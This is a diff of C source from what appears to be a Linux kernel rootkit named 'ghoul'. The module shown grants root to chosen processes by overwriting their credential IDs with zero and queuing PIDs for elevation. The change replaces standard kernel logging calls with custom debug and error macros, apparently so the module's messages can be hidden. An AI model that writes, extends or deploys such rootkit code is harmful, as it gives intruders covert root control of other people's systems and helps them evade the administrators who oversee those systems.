@@ -2,6 +2,7 @@
 #include <linux/sched.h>
 #include <linux/cred.h>
 #include <linux/slab.h>
+#include "ghoul.h"
 #include "privileges.h"
 
 LIST_HEAD(pids_waiting_for_root);
@@ -14,7 +15,7 @@ notrace void set_root(void)
     if (creds == NULL)
         return;
     
-    pr_info("ghoul: giving root to PID %d\n", current->pid);
+    debug("ghoul: giving root to PID %d\n", current->pid);
 
     creds->uid.val = creds->gid.val = 0;
     creds->euid.val = creds->egid.val = 0;
@@ -39,11 +40,11 @@ notrace void give_root(int pid)
         pid = current->parent->pid;
     
     // add PID to list of PIDs waiting for root
-    pr_info("ghoul: scheduled request to give root to PID %d\n", pid);
+    debug("ghoul: scheduled request to give root to PID %d\n", pid);
     pid_entry = kzalloc(sizeof(struct pid_list), GFP_KERNEL);
 
     if (pid_entry == NULL) {
-        pr_err("ghoul: memory allocation error while giving root\n");
+        error("ghoul: memory allocation error while giving root\n");
         return;
     }
 
